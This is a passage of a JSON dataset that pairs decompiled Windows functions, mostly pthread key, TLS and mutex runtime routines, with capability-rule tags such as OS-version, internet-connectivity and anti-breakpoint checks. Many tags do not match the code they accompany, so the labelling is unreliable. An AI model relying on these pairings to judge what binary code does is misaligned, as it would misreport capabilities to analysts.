        "decompiled_code": "\nint64_t fcn.0040d190(ulong arg1)\n\n{\n    uint32_t *arg1_00;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    ulong uVar3;\n    uint64_t uVar4;\n    bool bVar5;\n    code *pcVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    uint32_t uVar9;\n    uint64_t uVar10;\n    int32_t iVar11;\n    \n    iVar7 = fcn.0040d0f0(arg1);\n    iVar8 = iVar7;\n    if (iVar7 != 0) {\n        arg1_00 = iVar7 + 0x60;\n        iVar11 = 0x100;\n        do {\n            fcn.00410db0(arg1_00);\n            if (*(iVar7 + 0x48) == 0) {\n                iVar8 = 0x16;\n                if (arg1_00 != NULL) {\n                    piVar1 = iVar7 + 0x6c;\n                    LOCK();\n                    piVar2 = iVar7 + 0x6c;\n                    *piVar2 = *piVar2 + -1;\n                    pcVar6 = _sym.imp.KERNEL32.dll_Sleep;\n                    iVar11 = *piVar2;\n                    while (iVar11 != 0) {\n                        LOCK();\n                        *piVar1 = *piVar1 + 1;\n                        (*pcVar6)(0);\n                        LOCK();\n                        *piVar1 = *piVar1 + -1;\n                        iVar11 = *piVar1;\n                    }\n                    if (*(iVar7 + 100) < *arg1_00) {\n                        *(iVar7 + 100) = *(iVar7 + 100) + 1;\n                        if (*(iVar7 + 100) == *arg1_00) goto code_r0x00410d93;\n                    }\n                    else if (*(iVar7 + 100) == *arg1_00) {\ncode_r0x00410d93:\n                        *arg1_00 = 0;\n                        *(iVar7 + 100) = 0;\n                    }\n                    LOCK();\n                    *(iVar7 + 0x6c) = *(iVar7 + 0x6c) + 1;\n                    iVar8 = 0;\n                }\n                return iVar8;\n            }\n            bVar5 = false;\n            uVar10 = 0;\n            do {\n                uVar3 = *(*(iVar7 + 0x50) + uVar10 * 8);\n                if (*(*(iVar7 + 0x58) + uVar10) != '\\0') {\n                    if (*0x4349e0 == 0) {\n                        *0x4349e0 = fcn.00410a00(\"_pthread_key_lock_shmem\", 8, 0x40b9a0);\n                    }\n                    fcn.00411bf0(*0x4349e0);\n                    if (*0x434a08 == NULL) {\n                        *0x434a08 = fcn.00410a00(\"_pthread_key_dest_shmem\", 8, 0);\n                    }\n                    uVar4 = *(**0x434a08 + uVar10 * 8);\n                    *(*(iVar7 + 0x50) + uVar10 * 8) = 0;\n                    *(*(iVar7 + 0x58) + uVar10) = 0;\n                    if (1 < uVar4) {\n                        fcn.00410d10(arg1_00);\n                        if (*0x434a08 == NULL) {\n                            *0x434a08 = fcn.00410a00(\"_pthread_key_dest_shmem\", 8, 0);\n                        }\n                        bVar5 = true;\n                        (**(**0x434a08 + uVar10 * 8))(uVar3);\n                        fcn.00410db0(arg1_00);\n                    }\n                    if (*0x4349e0 == 0) {\n                        *0x4349e0 = fcn.00410a00(\"_pthread_key_lock_shmem\", 8, 0x40b9a0);\n                    }\n                    fcn.00411ea0(*0x4349e0);\n                }\n                uVar9 = uVar10 + 1;\n                uVar10 = uVar9;\n            } while (uVar9 < *(iVar7 + 0x48));\n            iVar8 = fcn.00410d10(arg1_00);\n        } while ((bVar5) && (iVar11 = iVar11 + -1,  iVar11 != 0));\n    }\n    return iVar8;\n}\n",
        "token_count": 1010
    },
    "0040dbb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.0040dbb0(uint32_t *arg1, int64_t arg2)\n\n{\n    uint32_t *puVar1;\n    int64_t iVar2;\n    uint32_t *puVar3;\n    uint64_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    \n    if (arg1 == NULL) {\n        return 0x16;\n    }\n    if (*0x4349e0 == 0) {\n        *0x4349e0 = fcn.00410a00(\"_pthread_key_lock_shmem\", 8, 0x40b9a0);\n    }\n    fcn.00411f40(*0x4349e0);\n    if (*0x4349d0 == NULL) {\n        *0x4349d0 = fcn.00410a00(\"_pthread_key_sch_shmem\", 4, 0);\n    }\n    uVar5 = **0x4349d0;\n    while( true ) {\n        if (*0x4349d8 == NULL) {\n            *0x4349d8 = fcn.00410a00(\"_pthread_key_max_shmem\", 4, 0);\n            uVar6 = **0x4349d8;\n        }\n        else {\n            uVar6 = **0x4349d8;\n        }\n        if (uVar6 <= uVar5) {\n            uVar5 = 0;\n            goto code_r0x0040dc83;\n        }\n        if (*0x434a08 == NULL) {\n            *0x434a08 = fcn.00410a00(\"_pthread_key_dest_shmem\", 8, 0);\n        }\n        uVar4 = uVar5;\n        if (*(**0x434a08 + uVar4 * 8) == 0) break;\n        uVar5 = uVar5 + 1;\n    }\ncode_r0x0040ddc0:\n    *arg1 = uVar5;\n    if (arg2 == 0) {\n        if (*0x434a08 == NULL) {\n            *0x434a08 = fcn.00410a00(\"_pthread_key_dest_shmem\", 8, 0);\n        }\n        *(**0x434a08 + uVar4 * 8) = 1;\n    }\n    else {\n        if (*0x434a08 == NULL) {\n            *0x434a08 = fcn.00410a00(\"_pthread_key_dest_shmem\", 8, 0);\n        }\n        *(**0x434a08 + uVar4 * 8) = arg2;\n    }\ncode_r0x0040ddde:\n    if (*0x4349e0 == 0) {\n        *0x4349e0 = fcn.00410a00(\"_pthread_key_lock_shmem\", 8, 0x40b9a0);\n    }\n    fcn.00411ea0(*0x4349e0);\n    return 0;\ncode_r0x0040dc83:\n    if (*0x4349d0 == NULL) {\n        *0x4349d0 = fcn.00410a00(\"_pthread_key_sch_shmem\", 4, 0);\n        uVar6 = **0x4349d0;\n    }\n    else {\n        uVar6 = **0x4349d0;\n    }\n    if (uVar6 <= uVar5) {\n        if (*0x4349d8 == NULL) {\n            *0x4349d8 = fcn.00410a00(\"_pthread_key_max_shmem\", 4, 0);\n        }\n        if (**0x4349d8 == 0x100000) {\ncode_r0x0040de80:\n            if (*0x4349e0 == 0) {\n                *0x4349e0 = fcn.00410a00(\"_pthread_key_lock_shmem\", 8, 0x40b9a0);\n            }\n            fcn.00411ea0(*0x4349e0);\n            return 0xc;\n        }\n        if (*0x4349d8 == NULL) {\n            *0x4349d8 = fcn.00410a00(\"_pthread_key_max_shmem\", 4, 0);\n        }\n        uVar5 = **0x4349d8 * 2;\n        if (uVar5 == 0) {\n            if (*0x4349d8 == NULL) {\n                *0x4349d8 = fcn.00410a00(\"_pthread_key_max_shmem\", 4, 0);\n            }\n            uVar5 = **0x4349d8 + 1;\n        }\n        uVar6 = 0x100000;\n        if (uVar5 < 0x100001) {\n            uVar6 = uVar5;\n        }\n        if (*0x434a08 == NULL) {\n            *0x434a08 = fcn.00410a00(\"_pthread_key_dest_shmem\", 8, 0);\n        }\n        iVar2 = sub.msvcrt.dll_realloc(**0x434a08);\n        if (iVar2 == 0) goto code_r0x0040de80;\n        if (*0x4349d8 == NULL) {\n            *0x4349d8 = fcn.00410a00(\"_pthread_key_max_shmem\", 4, 0);\n        }\n        sub.msvcrt.dll_memset();\n        if (*0x434a08 == NULL) {\n            *0x434a08 = fcn.00410a00(\"_pthread_key_dest_shmem\", 8, 0);\n        }\n        **0x434a08 = iVar2;\n        if (*0x4349d0 == NULL) {\n            *0x4349d0 = fcn.00410a00(\"_pthread_key_sch_shmem\", 4, 0);\n        }\n        puVar3 = *0x4349d8;\n        puVar1 = *0x4349d0;\n        if (*0x4349d8 == NULL) {\n            puVar3 = fcn.00410a00(\"_pthread_key_max_shmem\", 4, 0);\n            *0x4349d8 = puVar3;\n            *puVar1 = *puVar3 + 1;\n            if (puVar3 != NULL) goto code_r0x0040dd95;\n            puVar3 = fcn.00410a00(\"_pthread_key_max_shmem\", 4, 0);\n            *0x4349d8 = puVar3;\n            *arg1 = *puVar3;\n            if (puVar3 == NULL) {\n                puVar3 = fcn.00410a00(\"_pthread_key_max_shmem\", 4, 0);\n                *0x4349d8 = puVar3;\n            }\n        }\n        else {\n            **0x4349d0 = **0x4349d8 + 1;\ncode_r0x0040dd95:\n            *arg1 = *puVar3;\n        }\n        *puVar3 = uVar6;\n        if (arg2 == 0) {\n            if (*0x434a08 == NULL) {\n                *0x434a08 = fcn.00410a00(\"_pthread_key_dest_shmem\", 8, 0);\n            }\n            *(**0x434a08 + *arg1 * 8) = 1;\n        }\n        else {\n            if (*0x434a08 == NULL) {\n                *0x434a08 = fcn.00410a00(\"_pthread_key_dest_shmem\", 8, 0);\n            }\n            *(**0x434a08 + *arg1 * 8) = arg2;\n        }\n        goto code_r0x0040ddde;\n    }\n    if (*0x434a08 == NULL) {\n        *0x434a08 = fcn.00410a00(\"_pthread_key_dest_shmem\", 8, 0);\n    }\n    uVar4 = uVar5;\n    if (*(**0x434a08 + uVar4 * 8) == 0) goto code_r0x0040ddc0;\n    uVar5 = uVar5 + 1;\n    goto code_r0x0040dc83;\n}\n",
        "token_count": 1826
    },
    "0040e4e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.0040e4e0(uint64_t arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    \n    arg1 = arg1 & 0xffffffff;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    iVar2 = fcn.0040cd40();\n    fcn.00410db0(iVar2 + 0x60);\n    if ((*(iVar2 + 0x48) < arg1 || *(iVar2 + 0x48) == arg1) || (*(*(iVar2 + 0x58) + arg1) == '\\0')) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = *(*(iVar2 + 0x50) + arg1 * 8);\n    }\n    fcn.00410d10(iVar2 + 0x60);\n    (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n    return uVar3;\n}\n",
        "token_count": 220
    },
    "0040e7e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040e7e0(uint64_t arg1)\n\n{\n    int64_t iVar1;\n    uint64_t arg1_00;\n    uint *unaff_RBX;\n    \n    iVar1 = fcn.0040cd40();\n    arg1_00 = *(iVar1 + 0x1d8);\n    *(iVar1 + 8) = arg1;\n    if (arg1_00 != 0) goto code_r0x0040e861;\n    do {\n        if ((*(iVar1 + 0x40) & 0x30) == 0) {\n            fcn.004135e6(iVar1 + 0xd0, 1);\ncode_r0x0040e883:\n            *unaff_RBX = 0xdeadbeef;\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            iVar1 = *(unaff_RBX + 0x74);\n            *(unaff_RBX + 10) = 0;\njoined_r0x0040e8e5:\n            if (iVar1 == 0) {\n                fcn.0040c760(unaff_RBX);\n            }\n            if (*0x4349e8 == NULL) {\n                *0x4349e8 = fcn.00410a00(\"_pthread_tls_shmem\", 4, 0x40b990);\n            }\n            (*_sym.imp.KERNEL32.dll_TlsSetValue)(**0x4349e8, 0);\n        }\n        else {\n            if (*0x4349e8 == NULL) {\n                *0x4349e8 = fcn.00410a00(\"_pthread_tls_shmem\", 4, 0x40b990);\n            }\n            unaff_RBX = (*_sym.imp.KERNEL32.dll_TlsGetValue)();\n            if (unaff_RBX != NULL) {\n                if (*(unaff_RBX + 10) == 0) {\n                    *unaff_RBX = 0xdeadbeef;\n                    if (*(unaff_RBX + 0xc) != 0) {\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                    }\n                    iVar1 = *(unaff_RBX + 0x74);\n                    *(unaff_RBX + 0xc) = 0;\n                    arg1 = unaff_RBX[2];\n                    goto joined_r0x0040e8e5;\n                }\n                arg1 = unaff_RBX[2];\n                unaff_RBX[0x2f] = 1;\n                if (*(unaff_RBX + 0xc) != 0) {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                }\n                *(unaff_RBX + 0xc) = 0;\n                if ((*(unaff_RBX + 0x11) & 4) != 0) goto code_r0x0040e883;\n            }\n        }\n        arg1_00 = arg1 & 0xffffffff;\n        iVar1 = (*_sym.imp.msvcrt.dll__endthreadex)();\ncode_r0x0040e861:\n        fcn.0040d190(arg1_00);\n    } while( true );\n}\n",
        "token_count": 687
    },
    "0040ea60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t * fcn.0040ea60(ulong arg1)\n\n{\n    ulong *puVar1;\n    code *pcVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t *piVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    ulong uVar10;\n    int32_t **arg1_00;\n    char *arg1_01;\n    uint64_t uVar11;\n    uint32_t uVar12;\n    uint64_t uVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    ulong auStack224 [5];\n    ulong uStack184;\n    ulong uStack176;\n    int32_t *apiStack168 [2];\n    \n    piVar6 = fcn.0040d0f0(arg1);\n    piVar7 = piVar6;\n    if ((((piVar6 == NULL) || ((*(piVar6 + 0x10) & 0xc) != 0)) || (piVar7 = piVar6[0x2f],  piVar6[0x2f] != 0)) ||\n       ((piVar7 = piVar6[0x11] & 3U,  (piVar6[0x11] & 3U) != 3 ||\n        (piVar7 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(piVar6 + 0xc)),  piVar7 != 0)))) {\n        return piVar7;\n    }\n    fcn.00410100(piVar6 + 0xe);\n    fcn.0040e9e0();\n    piVar7 = fcn.0040cd40();\n    if ((piVar7 == NULL) || ((*(piVar7 + 0x10) & 0xc) != 0)) {\n        return piVar7;\n    }\n    if (*0x434a00 == NULL) {\n        *0x434a00 = fcn.00410a00(\"_pthread_cancelling_shmem\", 4, 0);\n    }\n    if (**0x434a00 == 0) {\n        return *0x434a00;\n    }\n    arg1_00 = piVar7 + 0xe;\n    fcn.00410710(arg1_00);\n    if ((((*(piVar7 + 0x10) & 3) != 0) && ((piVar7[0x11] & 1U) != 0)) && (piVar7[8] < 1)) {\n        piVar7[0x11] = piVar7[0x11] & 0xfffffffe;\n        *(piVar7 + 0x10) = *(piVar7 + 0x10) & 0xf3 | 4;\n        if (*(piVar7 + 0xc) != 0) {\n            (*_sym.imp.KERNEL32.dll_ResetEvent)();\n        }\n        fcn.00410100(arg1_00);\n        fcn.0040e9e0();\n        if (arg1_00 == NULL) {\n            apiStack168[1] = 0x40ebf5;\n            fcn.0040cd40();\ncode_r0x0040ebce:\n            apiStack168[1] = 0x40ebd3;\n            fcn.0040eac0();\n            apiStack168[1] = 0x40ebdb;\n            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n            apiStack168[1] = 0x40ebe0;\n            fcn.0040eac0();\n            return NULL;\n        }\n        apiStack168[1] = 0x40eb81;\n        uVar13 = fcn.00412280(arg1_00);\n        if (uVar13 < 0xffffffff) {\n            apiStack168[1] = 0x40ebc5;\n            iVar8 = fcn.0040cd40();\n            uVar11 = uVar13 & 0xffffffff;\n            if (uVar13 == 0) goto code_r0x0040ebce;\n        }\n        else {\n            apiStack168[1] = 0x40eb93;\n            iVar8 = fcn.0040cd40();\n            uVar11 = 0xffffffff;\n        }\n        apiStack168[1] = 0x40eba0;\n        fcn.0040eac0();\n        if (*(iVar8 + 0x30) == 0) {\n            apiStack168[1] = 0x40ec08;\n            (*_sym.imp.KERNEL32.dll_Sleep)(uVar11);\n        }\n        else {\n            apiStack168[1] = 0x40ebb1;\n            (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(iVar8 + 0x30), uVar11);\n        }\n        apiStack168[1] = 0x40ebb6;\n        fcn.0040eac0();\n        return NULL;\n    }\n    piVar7 = fcn.0040fb90(arg1_00);\n    if (piVar7 != 0) {\n        return piVar7;\n    }\n    uStack176 = *arg1_00;\n    if (uStack176[2] == 0) {\n        uVar14 = 1;\n        if (uStack176[5] == 0) goto code_r0x0040fec0;\n        goto code_r0x00410130;\n    }\n    iVar4 = uStack176[5];\n    if (iVar4 != 0) {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar4 == iVar5) {\n            if (uStack176[2] == 2) {\n                LOCK();\n                piVar7 = uStack176 + 3;\n                iVar4 = *piVar7;\n                *piVar7 = *piVar7 + -1;\n                if (iVar4 == 1) goto code_r0x00410130;\ncode_r0x00410152:\n                uVar14 = 0;\n            }\n            else {\ncode_r0x00410130:\n                uStack176[5] = 0;\n                if ((*(uStack176 + 6) == 0) ||\n                   (iVar4 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*(uStack176 + 6), 1, 0),  iVar4 != 0))\n                goto code_r0x00410152;\n                iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n                uVar14 = 1;\n                uStack176[5] = iVar4;\n            }\n            uStack176 = *arg1_00;\n            goto code_r0x0040fec0;\n        }\n        uStack176 = *arg1_00;\n    }\n    uVar14 = 1;\ncode_r0x0040fec0:\n    apiStack168[0] = uVar14;\n    if (*0x434a38 == 0) {\n        *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n    }\n    fcn.00410db0(*0x434a38);\n    iVar8 = *0x434a38;\n    if ((*uStack176 == -0x454e0ff3) && (0 < uStack176[1])) {\n        bVar15 = *0x434a38 == 0;\n        uStack176[1] = uStack176[1] + -1;\n        if (bVar15) {\n            *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n            fcn.00410d10(*0x434a38);\n            return apiStack168[0];\n        }\n        fcn.00410d10(iVar8);\n        return apiStack168[0];\n    }\n    iVar8 = (*_sym.imp.msvcrt.dll___iob_func)();\n    sub.msvcrt.dll_fprintf(iVar8 + 0x60, 0x42f208, \"(m_->valid == LIFE_MUTEX) && (m_->busy > 0)\");\n    sub.msvcrt.dll_exit(1);\n    arg1_01 = \"mutex_global_shmem\";\n    auStack224[0] = 0x410a26;\n    iVar4 = sub.msvcrt.dll_strlen();\n    auStack224[0] = 0x410a3e;\n    iVar9 = fcn.0040b810(arg1_01);\n    iVar9 = -iVar9;\n    iVar8 = &uStack184 + iVar9;\n    *(&uStack184 + iVar9) = 0x656d68732d636367;\n    *(&uStack176 + iVar9) = 0x64742d6d;\n    *(&uStack176 + iVar9 + 4) = 0x326d;\n    uVar14 = iVar4 + 0x50;\n    *(&uStack176 + iVar9 + 6) = 0x2d;\n    *(auStack224 + iVar9) = 0x410a86;\n    sub.msvcrt.dll_memcpy(&uStack176 + iVar9 + 7, \"mutex_global_shmem\", iVar4);\n    puVar1 = apiStack168 + iVar4 + iVar9;\n    *puVar1 = 0x6161616161616161;\n    puVar1[1] = 0x6161616161616161;\n    puVar1[2] = 0x6161616161616161;\n    puVar1[3] = 0x6161616161616161;\n    puVar1[4] = 0x6161616161616161;\n    puVar1[5] = 0x6161616161616161;\n    puVar1[6] = 0x6161616161616161;\n    puVar1[7] = 0x6161616161616161;\n    *(&uStack184 + uVar14 + iVar9) = 0;\n    *(&uStack184 + (iVar4 + 0xf) + iVar9) = 0;\n    *(auStack224 + iVar9) = 0x410ace;\n    uVar10 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0);\n    *(&uStack184 + (iVar4 + 0xf) + iVar9) = 0x2d;\n    *(auStack224 + iVar9) = 0x410ae4;\n    iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar10, 0xffffffff);\n    if (iVar5 != 0) {\n        pcVar2 = swi(3);\n        piVar7 = (*pcVar2)();\n        return piVar7;\n    }\n    *(auStack224 + iVar9) = 0x410af2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (uVar3 == 0) {\n        *(auStack224 + iVar9) = 0x410b07;\n        piVar6 = sub.msvcrt.dll_malloc(0x10);\n        uVar13 = 0x40;\n        do {\n            if ((piVar6 >> (uVar13 & 0x3f) & 1) != 0) {\n                *(iVar8 + (uVar14 - uVar13)) = 0x41;\n            }\n            uVar12 = uVar13 - 1;\n            uVar13 = uVar12;\n        } while (uVar12 != 0);\n        *(auStack224 + iVar9) = 0x410b33;\n        uVar3 = (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        if (uVar3 == 0) {\n            pcVar2 = swi(3);\n            piVar7 = (*pcVar2)();\n            return piVar7;\n        }\n        *(auStack224 + iVar9) = 0x410b49;\n        piVar7 = fcn.00410980(uVar3, iVar8, uVar14, iVar4 + 0x10);\n        if (piVar7 == piVar6) {\n            *(auStack224 + iVar9) = 0x410ba6;\n            sub.msvcrt.dll_memset(piVar6, 0, 0x10);\n            *(auStack224 + iVar9) = 0x410bb1;\n            (*0x40fb30)(piVar6);\n        }\n        else {\n            *(auStack224 + iVar9) = 0x410b59;\n            sub.msvcrt.dll_free(piVar6);\n        }\n    }\n    else {\n        *(auStack224 + iVar9) = 0x410b94;\n        piVar7 = fcn.00410980(uVar3, iVar8, uVar14, iVar4 + 0x10);\n    }\n    *(auStack224 + iVar9) = 0x410b62;\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar10);\n    *(auStack224 + iVar9) = 0x410b6b;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar10);\n    return piVar7;\n}\n",
        "token_count": 2935
    },
    "0040fb90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.0040fb90(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    ulong uVar3;\n    \n    piVar1 = *arg1;\n    if (*0x434a38 == 0) {\n        *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n    }\n    fcn.00410db0(*0x434a38);\n    piVar2 = *arg1;\n    uVar3 = 0x16;\n    if ((((piVar2 != NULL) && (*piVar2 == -0x454e0ff3)) && (uVar3 = 1,  2 < piVar2 + 3U)) && (piVar1[5] != 0)) {\n        uVar3 = 0;\n        piVar2[1] = piVar2[1] + 1;\n    }\n    if (*0x434a38 != 0) {\n        fcn.00410d10(*0x434a38);\n        return uVar3;\n    }\n    *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n    fcn.00410d10(*0x434a38);\n    return uVar3;\n}\n",
        "token_count": 310
    },
    "0040fc60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint8_t fcn.0040fc60(int64_t arg1)\n\n{\n    uint8_t uVar1;\n    \n    if (*0x434a38 == 0) {\n        *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n    }\n    fcn.00410db0(*0x434a38);\n    uVar1 = -(arg1 == 0) & 0x16;\n    if (*0x434a38 != 0) {\n        fcn.00410d10(*0x434a38);\n        return uVar1;\n    }\n    *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n    fcn.00410d10(*0x434a38);\n    return uVar1;\n}\n",
        "token_count": 199
    },
    "0040fd00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0040fd00(int32_t **arg1, int32_t **arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    *arg2 = NULL;\n    if (*0x434a38 == 0) {\n        *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n    }\n    iVar2 = fcn.00410c70(*0x434a38);\n    if (iVar2 != 0) {\n        return 0x10;\n    }\n    if ((arg1 == NULL) || (piVar1 = *arg1,  piVar1 == NULL)) {\n        uVar3 = 0x16;\n    }\n    else if (piVar1 + 3U < 3) {\n        *arg1 = NULL;\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 0x16;\n        if (((*piVar1 == -0x454e0ff3) && (uVar3 = 0x10,  piVar1[1] == 0)) && (piVar1[5] == 0)) {\n            *arg2 = piVar1;\n            uVar3 = 0;\n            *arg1 = NULL;\n        }\n    }\n    if (*0x434a38 == 0) {\n        *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n    }\n    fcn.00410d10(*0x434a38);\n    return uVar3;\n}\n",
        "token_count": 373
    },
    "0040fe40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t fcn.0040fe40(int64_t arg1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*(arg1 + 8) == 0) {\n        if (*(arg1 + 0x14) != 0) {\n            return 0x10;\n        }\n    }\n    else {\n        iVar1 = *(arg1 + 0x14);\n        if (iVar1 != 0) {\n            if (*(arg1 + 8) != 2) {\n                return 0x10;\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (iVar1 != iVar3) {\n                return 0x10;\n            }\n            LOCK();\n            *(arg1 + 0xc) = *(arg1 + 0xc) + 1;\n            return 0;\n        }\n    }\n    iVar1 = fcn.00412860(*(arg1 + 0x18), 1, 0);\n    if (iVar1 == 0x8a) {\n        return 0x10;\n    }\n    if (iVar1 == 0) {\n        *(arg1 + 0xc) = 1;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        *(arg1 + 0x14) = uVar2;\n        return 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 313
    },
    "004102b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.004102b0(int64_t *arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    \n    if (*0x434a30 == 0) {\n        *0x434a30 = fcn.00410a00(\"mutex_global_static_shmem\", 0x10, 0x40fb50);\n    }\n    fcn.00410db0(*0x434a30);\n    iVar2 = *arg1;\n    uVar1 = 0;\n    if (2 < iVar2 + 3U) goto joined_r0x0041032f;\n    if (iVar2 == -1) {\ncode_r0x004102f8:\n        uVar1 = fcn.004101e0(arg1, 0);\n    }\n    else {\n        if (iVar2 == -3) {\n            iVar2 = *0x434a28;\n            if (*0x434a28 == 0) {\n                iVar2 = fcn.00410a00(\"mxattr_recursive_shmem\", 4, 0x40fb70);\n                *0x434a28 = iVar2;\n            }\n        }\n        else {\n            if (iVar2 != -2) {\n                if (iVar2 == 0) {\n                    uVar1 = 0x16;\n                    goto joined_r0x0041032f;\n                }\n                goto code_r0x004102f8;\n            }\n            iVar2 = *0x434a20;\n            if (*0x434a20 == 0) {\n                iVar2 = fcn.00410a00(\"mxattr_errorcheck_shmem\", 4, 0x40fb80);\n                *0x434a20 = iVar2;\n            }\n        }\n        uVar1 = fcn.004101e0(arg1, iVar2);\n    }\njoined_r0x0041032f:\n    if (*0x434a30 == 0) {\n        *0x434a30 = fcn.00410a00(\"mutex_global_static_shmem\", 0x10, 0x40fb50);\n        fcn.00410d10(*0x434a30);\n        return uVar1;\n    }\n    fcn.00410d10(*0x434a30);\n    return uVar1;\n}\n",
        "token_count": 500
    },
    "00410410": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.00410410(int32_t **arg1)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    \n    if (*0x434a38 == 0) {\n        *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n    }\n    fcn.00410db0(*0x434a38);\n    if ((arg1 == NULL) || (piVar2 = *arg1,  piVar2 == NULL)) {\n        if (*0x434a38 == 0) {\n            *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n        }\n        fcn.00410d10(*0x434a38);\n        return 0x16;\n    }\n    if (piVar2 + 3U < 3) {\n        if (*0x434a38 == 0) {\n            *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n        }\n        fcn.00410d10(*0x434a38);\n        uVar1 = fcn.004102b0(arg1);\n        if (*0x434a38 == 0) {\n            *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n        }\n        fcn.00410db0(*0x434a38);\n        if ((uVar1 & 0xffffffef) != 0) {\n            if (*0x434a38 == 0) {\n                *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n            }\n            fcn.00410d10(*0x434a38);\n            return uVar1;\n        }\n        piVar2 = *arg1;\n        if (piVar2 != NULL) goto code_r0x0041044d;\n    }\n    else {\ncode_r0x0041044d:\n        if (*piVar2 == 